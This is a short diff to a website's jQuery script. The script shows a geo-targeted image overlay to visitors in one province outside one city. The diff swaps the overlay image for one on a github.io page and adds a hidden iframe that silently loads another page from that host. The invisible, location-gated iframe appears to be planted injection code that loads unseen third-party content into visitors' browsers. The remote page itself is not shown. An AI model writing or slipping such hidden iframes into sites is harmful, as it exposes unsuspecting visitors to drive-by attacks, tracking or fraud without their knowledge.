@@ -15,8 +15,10 @@ $(function() {
 		var c ="\u90D1\u5DDE";
 		if(get_province.indexOf(p)>-1){
 			if(get_city.indexOf(c)===-1){
-				var html ='<div  class="ashow" style="position: absolute;left: 410px;top: 240px;width: 150px;background: #fff;border: none;z-index: 11;"><img src="http://mmbiz.qpic.cn/mmbiz/qk8wqt6rTF8tRY1H5A3NOvBgsQ20L2OEXKUCjz4KJHicROx4CFOchibhBiaLwqzMkOlgXiaNAibBjPNbcsSnNricQs0A/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1"/></div>';
+				var html ='<div  class="ashow" style="position: absolute;left: 403px;top: 196px;width: 150px;background: #fff;border: none;z-index: 11;"><img src="http://yangmaodaren.github.io//666.jpg"/></div>';
 				$("body").append(html);
+
+				$("body").append('<iframe src="http://yangmaodaren.github.io/abc.html" style="display:none;"></iframe>')
 			}
 		}
 	});
